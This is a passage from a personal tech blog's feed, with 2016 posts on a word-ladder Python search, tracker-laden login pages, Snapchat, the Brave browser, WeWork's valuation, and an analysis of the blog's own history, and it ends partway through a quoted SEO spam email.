  <span class="n">splits</span> <span class="o">=</span> <span class="p">[(</span><span class="n">word</span><span class="p">[:</span><span class="n">i</span><span class="p">],</span> <span class="n">word</span><span class="p">[</span><span class="n">i</span><span class="p">:])</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">word</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)]</span>
  <span class="n">replaces</span> <span class="o">=</span> <span class="p">[</span><span class="n">a</span> <span class="o">+</span> <span class="n">c</span> <span class="o">+</span> <span class="n">b</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span> <span class="k">for</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">splits</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">alphabet</span> <span class="k">if</span> <span class="n">b</span><span class="p">]</span>
  <span class="k">return</span> <span class="p">[</span><span class="n">r</span> <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">replaces</span> <span class="k">if</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">dictionary</span><span class="p">]</span>

<span class="c1"># Had to remember how to get this working again
# Took a bunch from http://eddmann.com/posts/depth-first-search-and-breadth-first-search-in-python/
</span><span class="k">def</span> <span class="nf">bfs_paths</span><span class="p">(</span><span class="n">source</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="n">dictionary</span><span class="p">,</span> <span class="n">alphabet</span><span class="p">):</span>
  <span class="n">queue</span> <span class="o">=</span> <span class="n">deque</span><span class="p">(((</span><span class="n">source</span><span class="p">,</span> <span class="p">[</span><span class="n">source</span><span class="p">]),))</span>
  <span class="k">while</span> <span class="n">queue</span><span class="p">:</span>
    <span class="n">v</span><span class="p">,</span> <span class="n">path</span> <span class="o">=</span> <span class="n">queue</span><span class="p">.</span><span class="n">popleft</span><span class="p">()</span>
    <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="p">[</span><span class="n">w</span> <span class="k">for</span> <span class="n">w</span> <span class="ow">in</span> <span class="n">adjacent_words</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">alphabet</span><span class="p">)</span> <span class="k">if</span> <span class="n">w</span> <span class="ow">not</span> <span class="ow">in</span> <span class="nb">set</span><span class="p">(</span><span class="n">path</span><span class="p">)]:</span>
      <span class="k">if</span> <span class="n">n</span> <span class="o">==</span> <span class="n">target</span><span class="p">:</span>
        <span class="k">yield</span> <span class="n">path</span> <span class="o">+</span> <span class="p">[</span><span class="n">n</span><span class="p">]</span>
      <span class="k">else</span><span class="p">:</span>
        <span class="n">queue</span><span class="p">.</span><span class="n">append</span><span class="p">((</span><span class="n">n</span><span class="p">,</span> <span class="n">path</span> <span class="o">+</span> <span class="p">[</span><span class="n">n</span><span class="p">]))</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
  <span class="n">alphabet</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">lowercase</span>
  <span class="n">dictionary</span> <span class="o">=</span> <span class="n">load_dictionary</span><span class="p">()</span>

  <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">bfs_paths</span><span class="p">(</span><span class="s">'dog'</span><span class="p">,</span> <span class="s">'cat'</span><span class="p">,</span> <span class="n">dictionary</span><span class="p">,</span> <span class="n">alphabet</span><span class="p">):</span>
    <span class="k">print</span> <span class="n">x</span></code></pre></figure>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Whatever happened to automatic login?</title>
   <link href="http://dangoldin.com/2016/07/16/whatever-happened-to-automatic-login/"/>
   <updated>2016-07-16T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/07/16/whatever-happened-to-automatic-login</id>
   <content:encoded><![CDATA[
<p>When I started building sites one of the accepted principles was to give customers what they want as soon as you can. This manifested itself by taking users to the logged in view whenever they navigated to the site’s homepage. This makes sense - if you know a user’s logged in why waste their time by showing them a homepage that’s designed to sell the product?</p>

<p>Yet recently I encountered two sites, <a href="https://www.greenhouse.io/">Greenhouse</a> and <a href="https://tallie.com/">Tallie</a>, that will default to the homepage and only load the logged in view when I click the sign in link. One argument is that they both have separate domains for the logged in experience - app.greenhouse.io rather than www.greenhouse.io and usetallie.com rather than tallie.com - but there’s nothing stopping them from redirecting to those as soon as they recognize that a user is logged in.</p>

<p>One explanation is that they’re using different domains for the landing page versus the app but it’s still odd. Greenhouse can set cookies at the wildcard domain (*.greenhouse.io) and Tallie can make the necessary redirect or client side check to see whether a user is logged in. In fact if you actually go to usetallie.com first it will redirect you to tallie.com which, after clicking on “Client Login”, will take you back to usetalie.com.</p>

<p>Another explanation is that they want to save on hosting costs and serve a purely static webpage at first. This way they don’t need any dynamic content and only need to have the dynamic logic for when a user wants to login. This seems like a reach though - these are both enterprise apps and can’t possibly have the traffic load to warrant this degradation of the user experience. Even then the cost of doing a simple login check should be enough for any modern web application to handle.</p>

<p>The last explanation I can think of is that there’s something on the homepage that they want every user to experience. And the only thing that would make sense is tracking and advertising. One potential reason is that the content is so sensitive that they either legally can’t or just don’t want to drop third party trackers inside the app yet still want the ability to target and track users who’ve landed on the home page. A preliminary look using Ghostery bears this out - the homepage for Tallie drops 20 trackers while the in app page drops 6, most of which are for analytics. For Greenhouse it’s not as direct with the homepage dropping 17 while the in app page drops 13, most of which are advertising related. If this is the case I’m disappointed, but not surprised, that user experience was sacrificed to drop some third party JavaScript trackers.</p>

<ul class="thumbnails">
  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/greenhouse-tallie-trackers.png" alt="Ghostery trackers: Tallie home + app, Greenhouse home + app" width="1017" height="343" layout="responsive"/>
      <p>Ghostery trackers: Tallie home + in app, Greenhouse home + in app</p>
    </div>
  </li>
</ul>

<p>I’m searching for other explanations but can’t think of anything that else that would encourage this “anti-pattern” to make a comeback. If anyone has any ideas I’d love to hear them.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>A Twitter Moments fail</title>
   <link href="http://dangoldin.com/2016/07/10/a-twitter-moments-fail/"/>
   <updated>2016-07-10T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/07/10/a-twitter-moments-fail</id>
   <content:encoded><![CDATA[
<div class="right10">
  <img src="http://dangoldin.com/assets/static/images/twitter-moments-fail.png" alt="Content not available in your country" width="750" height="1334" layout="responsive"/>
</div>

<p>I’m a huge Twitter fan so it’s especially frustrating when I encounter issues. The latest one was discovering a “This content is not available in your country” message when trying to catch up on some Euro Cup highlights in a moment. I understand that in today’s digital rights world there’s always a chance for some content to be unavailable but there’s no reason it should have been included in Twitter’s flagship product that’s supposed to attract and engage new users. The fact that it’s manually curated makes it even worse - how could this have slipped through? One explanation is that the curator was not based in the US and had access to the video. The other is that the video was available initially but was pulled later on. In both cases Twitter should have had the appropriate safeguards to identify this was happening and amend the moment. An even better approach would have been to have different versions of the moment depending on the user’s location. The current implementation just feels sloppy and I can’t stand to see it in a product I love using.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Consumer protection for UX</title>
   <link href="http://dangoldin.com/2016/07/09/consumer-protection-for-ux/"/>
   <updated>2016-07-09T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/07/09/consumer-protection-for-ux</id>
   <content:encoded><![CDATA[
<p>I haven’t seen much written about how consumer protection relates to a product’s user experience but it’s a topic that’s worth exploring. I was reminded of this when my mortgage loan was sold to a new servicer. I came home to find a letter in the mail notifying me that my loan has been sold and that going forward I’d have to use a different payment portal and system. It was simple enough to register but the payment process became less efficient and there was no support for a Mint integration.</p>

<p>This is clearly a first world problem and there are a lot of benefits that come with being able to buy and sell loans. It’s the foundation of our financial system and allows companies to specialize across the entire loan business - some are designed for loan origination while others focus on servicing. This also encourages companies to improve their loan valuation models since if they’re able to identify an arbitrage opportunity they can trade on it and profit.</p>

<p>At the same time it’s frustrating that as a consumer I have no say in what happens and it’s a commitment made on my behalf for multiple decades. I don’t know what the right answer is here. User experience is highly subjective and what works for me may not work for someone else and products should hopefully improve over time yet I think there is something here. As an engineer the simple answer would be to force every consumer facing company to expose all functionality and data via an open API which would allow any experience to be crafted around it but I can’t imagine that actually happening. And maybe none of this will actually matter since AI will get to the point where we won’t need to interact with any of these services directly.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Maximize the potential energy of your code</title>
   <link href="http://dangoldin.com/2016/07/04/maximize-the-potential-energy-of-your-code/"/>
   <updated>2016-07-04T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/07/04/maximize-the-potential-energy-of-your-code</id>
   <content:encoded><![CDATA[
<blockquote>
<p>
  <strong>Potential energy</strong>: the energy of a body or a system with respect to the position of the body or the arrangement of the particles of the system.<br />
  <a href="http://www.dictionary.com/browse/potential-energy">Dictionary.com</a>
</p>
</blockquote>

<blockquote>
<p>
  <strong>Kinetic energy</strong>: the energy of a body or a system with respect to the motion of the body or of the particles in the system.<br />
  <a href="http://www.dictionary.com/browse/kinetic-energy">Dictionary.com</a>
</p>
</blockquote>

<p>I’m constantly striving to discover new ways of thinking about code and my latest is thinking about it through what many of us learned in high school physics - potential and kinetic energy. The definitions are above but a simple way to think about it that potential energy is what your system is capable of while kinetic is exercising that option. One can look at code the same way. Code that has a high potential energy can be turned into a vast amount of kinetic energy that can deliver new products and features at an amazing pace. This is code that is well architected and tested and is designed in such a way that it can be easily modified to handle whatever it comes its way. Code with low potential energy, on the other hand, is poorly designed with small changes leading to unintended side effects such that most of the time is spent fixing the code up. The comparison here between a rocket and an old, rickety car is appropriate. The rocket expends the bulk of its energy in minutes and travels hundreds of miles. The car breaks down every couple of miles and requires a skilled mechanic just to keep it going for another few miles.</p>

<p>But in physics we have the law of the <a href="https://en.wikipedia.org/wiki/Conservation_of_energy">Conservation of Energy</a> stating that energy can’t be created nor destroyed. This also applies to code! Taking code with a high potential energy and quickly modifying to solve a need may reduce its potential energy. In this case it’s up to us as developers to exert effort to bring it back up its high potential energy state.</p>

<p>This metaphor is an obvious exaggeration but it does strike at what makes for good code and something we should all strive to write. It’s not about being brilliant or elegant or simple but about being flexible enough to support whatever the world throws at it and it’s up to us to keep it at that level. To keep pushing the physics - every new feature adds <a href="https://en.wikipedia.org/wiki/Entropy_(order_and_disorder)">entropy</a> to our codebase and unless we actively clean it up it only gets worse.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Snapchat's massive potential</title>
   <link href="http://dangoldin.com/2016/07/03/snapchats-massive-potential/"/>
   <updated>2016-07-03T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/07/03/snapchats-massive-potential</id>
   <content:encoded><![CDATA[
<p>The more I use Snapchat the more obvious the potential. The way the product has evolved reminds me of Facebook’s history. Facebook started simply as a profile page for Ivy League college students but due to strong execution and brilliant product decisions has grown into the current behemoth. Snapchat is on a similar path - the initial version was a simple ephemeral photo sharing app but the recent updates seem frequent and massively impactful.</p>

<div class="right10">
  <img src="http://dangoldin.com/assets/static/images/snapchat-trailer-ad.png" width="750" height="1334" layout="responsive"/>
  <p class="caption">Movie tickets within Snapchat</p>
</div>

<p>Earlier today I was messing around and spotted a movie trailer ad for Swiss Army Man that was followed by an option to swipe up to buy the movie tickets that felt native to Snapchat. I didn’t have to click to go to another app and it felt natural to just swipe to get to the next step. And this was a simple case of buying movie tickets. I can imagine this flow expanding to other scenarios that follow a powerful ad with an immediate transaction. This echoes WeChat - the powerhouse app in China that’s an unholy mix of a <a href="http://a16z.com/2015/08/06/wechat-china-mobile-first/">social network, a payments platform, and an app ecosystem</a>. There’s no equivalent of WeChat outside of China and I suspect most think the replacement will look like a WeChat clone. Snapchat feels completely different yet has the potential to be more. WeChat’s foundation is a third party app ecosystem that’s built on top of text while Snapchat is almost entirely visual and asserts a high bar for third party experiences.</p>

<p>This is huge. Interacting with Snapchat is a joy, whether it’s taking photos, playing with the filters, checking our your friends’ stories, or watching the Discover videos and this is due to the masterful job they did with the interactions. They’re not immediately obvious but once discovered are intuitive and consistent across the variety of experiences. Want to go next? Just tap. Want to dig deeper? Swipe up. Want to go back? Swipe down. This is incredibly powerful. By learning these shortcuts Snapchat is able to offer a variety of adventures that users can easily engage with without taking up any additional screen space. This allows every experience Snapchat offers to take up the full screen which keeps us in the moment and makes it easy for us to keep going.</p>

<p>Snapchat is already taking the baby steps of becoming a platform by enabling external parties to build on top of Snapchat. The obvious case are the content producers Snapchat is partnering with but a more telling example is the way they’re approaching geofilters. <a href="https://snapchat.com/geofilters">Geofilters</a> are created offline, are then uploaded to the Snapchat site, and after approval become accessible in the app. This is a foreshadowing of the Snapchat formula - build out a compelling in-app experience and then follow it up with tools for outsiders to craft their own.</p>

<p>The movie trailer ad can be extended to highlight products - a compelling video of a product that can then be followed up with an option to buy. This can extend into multi-touch - imagine being able to tap on different sections of the screen that drive different experiences. If I’m watching the Olympic trials I can tap on the different players to get some more information about each one or if I’m watching some NBA highlights I can tap on LeBron’s jersey or sneakers to get taken to the Snapchat-integrated Nike Store. And this is just scratching the surface - by focusing on new highly engaging user experiences and setting up the tools to create these compelling stories Snapchat can transition into an incredibly powerful platform.</p>

<p>Snapchat should have no problems monetizing. The advertising industry can be broken down into two major types - brand advertising and direct response. Brand advertising is the typical TV ad that’s focused on building awareness and selling a story and lifestyle. Direct response, on the other hand, is about getting the customer to “convert” and requires every dollar spent to back out into a measurable return. Think of Google Adwords - you search Google for a book, click the sponsored Amazon link, and then buy it - Amazon will then know how much you paid for the book as well as how much the click cost. Using this data they can then optimize their campaigns to maximize profit. Snapchat may be able to sit at that intersection. It’s the perfect platform for high quality brand videos that take up the full screen but can also drop down into transactions - think of my movie trailer/ticket experience earlier today. This will help them get closer to the holy grail of advertising by attributing purchases to brand advertising.</p>

<p>Snapchat is tiny compared to Facebook but major shifts in the tech world have never been direct. New platforms start at the fringes but keep growing until they supplant the incumbents. Google superseded Microsoft by becoming the entry point to the web. Facebook is supplanting Google by bypassing the open web and providing app experiences on every platform. How would Snapchat unseat Facebook? I don’t know but I’m sure Facebook’s watching.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Low cost at small scale</title>
   <link href="http://dangoldin.com/2016/06/26/low-cost-at-small-scale/"/>
   <updated>2016-06-26T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/06/26/low-cost-at-small-scale</id>
   <content:encoded><![CDATA[
<p>The Wall Street Journal had a <a href="http://www.wsj.com/amp/articles/why-fruits-and-veggies-are-so-crazy-cheap-in-chinatown-1466762400">great piece</a> on why produce is so cheap in Chinatown. The conclusion:</p>

<blockquote>
  <p>Her discovery: Chinatown’s 80-plus produce markets are cheap because they are connected to a web of small farms and wholesalers that operate independently of the network supplying most mainstream supermarkets.</p>
  <p>Most of the city’s fruits and vegetables come from wholesalers at the Hunts Point Produce Market, the South Bronx distribution hub boasting all the color and accessibility of La Guardia Airport. Chinatown’s green grocers, in contrast, buy their stock from a handful of small wholesalers operating from tiny warehouses right in the neighborhood.</p>
  <p>Because the wholesalers are in Chinatown, they can deliver fresh produce several times a day, eliminating the need for retailers to maintain storage space or refrigeration, said Ms. Imbruce.</p>
</blockquote>

<p>I love this. It runs counter to the common belief that cheaper prices can also be achieved through massive scale. Yet in what I suspect is one of the hardest industries, food distribution in NYC, small scale seems to be doing the better job. Produce has an extremely short shelf life and combined with the cost of real estate in NYC it must require some incredible management to be able to sell it for the half the price of produce found at the supermarket. And everyone involved ends up winning - consumers get cheap prices and a great selection, the stands are able to turn around a ton of inventory due to the low prices, and the farms benefit from the variety of crops they’re able to grow.</p>

<p>This is a perfect example of being able to build a successful business by focusing on activities that complement each other (à la <a href="https://hbr.org/1996/11/what-is-strategy">Michael Porter</a>): they have their own local wholesalers that get constant replenishment that can then be priced incredibly cheaply which encourages high turnover and feeds back into the need for quick replenishment. This also allows them to focus on produce that doesn’t need to be kept on the shelf as long and is expected to be sold and eaten within a short amount of time. They embraced the idea of “making it up in volume” by setting up every activity to drive that goal.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>The Brave browser</title>
   <link href="http://dangoldin.com/2016/06/23/the-brave-browser/"/>
   <updated>2016-06-23T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/06/23/the-brave-browser</id>
   <content:encoded><![CDATA[
<p>Trying to launch a new browser seems like a fool’s errand and yet if there’s anyone that can do it it’s <a href="https://en.wikipedia.org/wiki/Brendan_Eich">Brendan Eich</a>, who in addition to creating JavaScript also ran Mozilla. Given his pedigree I decided to give his new browser, <a href="https://brave.com/">Brave</a>, a shot. It’s definitely a bit on the rough side compared to the mainstream browsers but it’s surprisingly fast. The speed improvement comes from a built in adblocker rather than having it implemented via slower browser extensions. At the same time Brave wants to pay publishers for their content by partnering with higher quality advertisers in order to serve benevolent ads that should also be priced at a premium.</p>

<p>The difficulty with this approach is that tracking users is what makes the advertising so valuable. Being able to track users allows advertisers to see what users care about, their purchase intent, as well as a whole slew of demographic information based on their consumption behavior. Eliminating this will cause advertisers to be shooting in the dark. There’s a reason Google and Facebook are eating up nearly 80% of every advertising dollar - they’re leveraging their data to provide extremely targeted and effective advertising that will be tough to do without the ability to track users.</p>

<p>I can see the case that Brave can centralize the tracking and allow users to opt into sharing this data with various partners. The challenge is getting advertisers on board with this as they would have to trust Brave for their reporting and getting users to opt in to this. I know very few people who’ve used adblock and then decided to switch back to a full ad experience. Brave has a tough road ahead.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Messaging app fragmentation</title>
   <link href="http://dangoldin.com/2016/06/22/messaging-app-fragmentation/"/>
   <updated>2016-06-22T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/06/22/messaging-app-fragmentation</id>
   <content:encoded><![CDATA[
<p>The messaging space is fascinating. There are probably hundreds of apps available with pretty massive fragmentation. Onavo collected the following data to indicate the reach of the various messaging apps by country and while WhatsApp (owned by Facebook) is clearly dominant there are some countries that WhatsApp is a fringe player, especially among Asian countries.</p>

<img src="http://dangoldin.com/assets/static/images/onavo-insights-global-messaging-reach.png" alt="Onavo Insights global messaging app reach" width="593" height="863" layout="responsive"/>
<p class="caption"><a href="https://techcrunch.com/2013/06/13/messaging-apps/">via TechCrunch</a></p>

<p>It’s shocking how dominant the local companies are in Asia. WeChat is the behemoth in China. In Japan it’s Line. And in Korea it’s KakaoTalk. I don’t know whether it’s as simple as nationalism or that the local companies just have a much better understanding of the market and were able to build better products.</p>

<p>I just view messaging apps as utilities.There’s no need to restrict myself to a single app and I use them reactively. If someone messages out via iMessage I’ll use that. If someone uses WhatsApp I’ll use that. And so on. If a friend asks me to use a particular app I have no problem downloading it and giving it a shot. They have limited network effects and there’s no reason to restrict yourself to one.</p>

<p>I suspect most people feel the same way. They probably have an app that’s the goto with their most frequently messaged group but if they’re part of another group that has their own principal app there’s nothing stopping them from using it.</p>

<p>The most dominant apps will be the ones that are able to leverage them to become utilities. Tencent has built a massive business on top of WeChat which acts as the digital hub in China. WeChat is not just for messaging but is essentially the operating system for mobile in China. It can be used to interact with a litany of services in china - including payment at physical stores, booking ridesharing services, and serving as an authority on identity. Nothing like this exists in the US or Europe and it’ll be interesting to see what comes out.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Blogging from my phone</title>
   <link href="http://dangoldin.com/2016/06/19/blogging-from-my-phone/"/>
   <updated>2016-06-19T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/06/19/blogging-from-my-phone</id>
   <content:encoded><![CDATA[
<p>A few weeks ago I had to run some errands at the mall and ended up having some free time. I was also a few blog posts behind so decided to see how much I could actually do via phone. Surprisingly, I got a fair amount done. The posts still required a fair amount of editing when I was back on my computer but for getting the bulk of the content and structure down on my phone was nearly as good as via a real keyboard. What it lacked in speed it made up for by not having real multitasking which made it more difficult to get distracted. It wouldn’t work for posts that require search or significant research but for quick blurbs or jotting down thoughts it works remarkably well and I suspect it will only improve with time. Years ago I viewed phones and tablets as being purely designed for consumption rather than creation so this has been a pleasant surprise and I’m coming around to the idea that one can be productive without an actual computer. Next is to try attempting to write a blog post via voice dictation.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>AWS, Stripe, and WeWork</title>
   <link href="http://dangoldin.com/2016/06/18/aws-stripe-and-wework/"/>
   <updated>2016-06-18T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/06/18/aws-stripe-and-wework</id>
   <content:encoded><![CDATA[
<p>I have been subscribed to <a href="https://stratechery.com/">Stratechery</a> for almost a year now but have recently started listening to the <a href="http://exponent.fm/">Exponent podcasts</a>. One of them, titled <a href="http://exponent.fm/episode-071-pickaxe-retailers-2/">Pickaxe Retailers</a>, makes the case that WeWork has an appropriate valuation due to their ability to leverage their strong brand and become the utility layer for real estate as well as provide a slew of products to their tenants. Similar to the way AWS has eliminated the need to run your own data center and Stripe has eliminated the need to acquire merchant accounts and negotiate with vendors, WeWork may do the same for physical space - both commercial and <a href="http://www.fastcompany.com/3055325/from-wework-to-welive-company-moves-members-into-its-first-residential-building">residential</a>.</p>

<p>While the explanation is reasonable it’s tough for me to buy into it. The decision to use any product boils down to how easy is it to switch and what’s the cost/revenue potential. In the case of AWS it’s incredibly costly to switch. You have to incur the cost of updating your code and deployment to make sure it will run on a new platform, retraining your team, and if you plan on switching to your own datacenter then hiring for roles you’ve never had to deal with. Added to this you have Amazon constantly cutting costs while innovating on new products. The value in switching only comes at massive scale - even Dropbox is getting beaten up over their move away from Amazon instead of focusing on building a more compelling product.</p>

<p>Stripe is in a similar situation. Despite providing a seemingly simple service it’s difficult and costly to replace. Stripe contains customer data and has a slew of products, for example subscriptions, that make it tough to switch. Imagine having to ask every customer to re-enter their credit card information. At the same time, Stripe gets cheaper and cheaper as your volume increases which makes it less and less compelling to replace.</p>

<p>I just don’t see these sort of arguments holding true for WeWork. AWS and Stripe both run services that start of cheap and get even cheaper as you scale. They’re both unbelievably sticky and have a growing cost of switching. WeWork has neither of these. The actual office space may be great but over time it gets easier to make the decision to rent your space directly rather than pay WeWork’s margins. WeWork does provide additional services that make their space great when you’re small. Unfortunately, these same services can easily be outsourced as you grow. For unlimited coffee you go with <a href="http://www.joyridecoffeedistributors.com/service/page/cold-brew-iced-coffee-kegerators-coffee-kegs/">Joyride</a>. For office cleaning and maintenance you go with <a href="https://managedbyq.com/">Managed by Q</a>. For food you can go with one of the hundreds of delivery startups. Every service WeWork provides can be had via a separate company..</p>

<p>Picture a small company starting out on AWS, using Stripe, and renting an office at WeWork. As they grow it’s easy to imagine them still using AWS, still using Stripe, but no longer at WeWork. Netflix is the perfect example. They’re a public company with a current market cap of just under $41 billion. Yet they’re still on AWS. And Amazon is a competitor! I can’t imagine any public company using WeWork as their primary office space solution.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Analyzing my blog</title>
   <link href="http://dangoldin.com/2016/06/12/analyzing-my-blog/"/>
   <updated>2016-06-12T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/06/12/analyzing-my-blog</id>
   <content:encoded><![CDATA[
<p>I started actively blogging in 2013 and have been consistently writing 2 posts a week. There’s a ton of information here and I spent some time learning R all over again in order to analyze and visualize my blogging history. I started with a simple <a href="https://github.com/dangoldin/blog-analytics/blob/master/analyze.py">Python script</a> that went through each post and dumped it into a CSV file with a series of columns that would be easy to <a href="https://github.com/dangoldin/blog-analytics/blob/master/analyze.R">analyze via R</a>. The columns ranged from numeric stats - such as how many words, tags, images, and links - to the actual text of the post itself. The goal was to put in a structured enough shape that the rest of the analysis could be handled in R. I started by collecting some summary statistics and looking at them over time but got carried away and ended up digging deeper into my evolution as a blogger.</p>

<p>Some high level stats to start it off:</p>

<ul>
  <li>412 total posts with 54 of them before 2013</li>
  <li>725 total links</li>
  <li>537 total tags</li>
  <li>1,379 total keywords</li>
  <li>9,705 total words in the meta descriptions</li>
  <li>145,499 total words of content</li>
</ul>

<ul class="thumbnails">
  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/date_year-plot-count.png" alt="Posts by year" width="2525" height="1425" layout="responsive"/>
      <p>As mentioned I started actively blogging in 2013 so there's no surprise here.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/date_year-plot-words.png" alt="Words by year" width="2525" height="1425" layout="responsive"/>
      <p>Given that I've written the same number of posts in 2013, 2014, and 2015 it looks as if my posts have gotten shorter and shorter.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/date_year-plot-links.png" alt="Links by year" width="2525" height="1425" layout="responsive"/>
      <p>Similar to the point above - I'm sharing fewer and fewer links.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/date_year-plot-tags.png" alt="Tags by year" width="2525" height="1425" layout="responsive"/>
      <p>Yet I'm still tagging the posts at roughly the same rate. This makes sense since I'll do anywhere from 1 to 3 tags per post.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/date_month-plot-count.png" alt="Posts by month" width="2525" height="1425" layout="responsive"/>
      <p>By month there's a bit more noise due to vacations but am keeping pace with 2 a week.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/date_month-plot-words.png" alt="Words by month" width="2525" height="1425" layout="responsive"/>
      <p>Nothing obvious here.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/date_week-plot-words-v2.png" alt="Words by week" width="2525" height="1182" layout="responsive"/>
      <p>Just for fun but this is the total number of words by week. I also did this by day but it was even noisier.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/dow-plot-count.png" alt="Posts by day of week" width="2525" height="1425" layout="responsive"/>
      <p>Clearly I write more during the weekend. Note that I had to prepend a number to the day of week to get the sort working.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/dow-plot-words.png" alt="Words by day of week" width="2525" height="1425" layout="responsive"/>
      <p>Similarly, the number of words is also higher on weekends.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/date_year-dow-plot1.png" alt="Number of posts by day of week and year" width="2525" height="1425" layout="responsive"/>
      <p>Another way to look at it is to see the distribution by year. In 2013 I was actually pretty on-point with my Tuesday/Friday writing schedule but since then have regressed to mostly writing on the weekends.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/date_year-dow-plot2.png" alt="Number of posts by year and day of week" width="2525" height="1425" layout="responsive"/>
      <p>The same information as above but switching the X and Y axes. I find this one not as easy to interpret as the previous one.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/company-mention.png" alt="Company mentions" width="2525" height="1425" layout="responsive"/>
      <p>This examines the various companies I mentioned over time. Google's dominant and it looks as if I haven't written about microsoft since 2014. You can also see the rise of Uber and Snapchat.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/language-mention.png" alt="Java mentions" width="2525" height="1425" layout="responsive"/>
      <p>Looks as if 2015 was the year of languages with Python and JavaScript dominating the others.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/wordcloud.png" alt="Tag wordcloud" width="600" height="600" layout="responsive"/>
      <p>Word cloud of the various tags I used on my posts. Clearly I like engineering and startups.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/wordcloud_2013.png" alt="Tag wordcloud 2013" width="600" height="600" layout="responsive"/>
      <p>Tag wordcloud for 2013. All about startups and design here.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/wordcloud_2014.png" alt="Tag wordcloud 2014" width="600" height="600" layout="responsive"/>
      <p>Tag wordcloud for 2014. This gets deeper into technology with strong representation by AWS, devops, coding, as well as a variety of programming languages.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/wordcloud_2015.png" alt="Tag wordcloud 2015" width="600" height="600" layout="responsive"/>
      <p>Tag wordcloud for 2015. Welcome to engineering management. In 2015 I developed into a manager and start writing about the various lessons I've learned on the journey.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/wordcloud_2016.png" alt="Tag wordcloud 2016" width="600" height="600" layout="responsive"/>
      <p>Tag wordcloud for 2016. Nothing significant yet and looks like a pretty healthy mix of the prior years. We'll see how this looks after the year is over.</p>
    </div>
  </li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Following up on a website optimization offer</title>
   <link href="http://dangoldin.com/2016/06/11/following-up-on-a-website-optimization-offer/"/>
   <updated>2016-06-11T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/06/11/following-up-on-a-website-optimization-offer</id>
   <content:encoded><![CDATA[
<p>I’ve been getting a stream of offers to help “optimize” my site and decided to follow through with one and see where it went. The general pitch is to call out existing errors and problems and offer a service to help fix the variety of errors and improve my search ranking. Here’s the text of the most recent email:</p>

<blockquote>
<p>Dear business owner of dangoldin.com,</p>
<p>How is it possible that your website is having so many errors? Yes, most of the people share their anger and frustration once they get my email.</p>
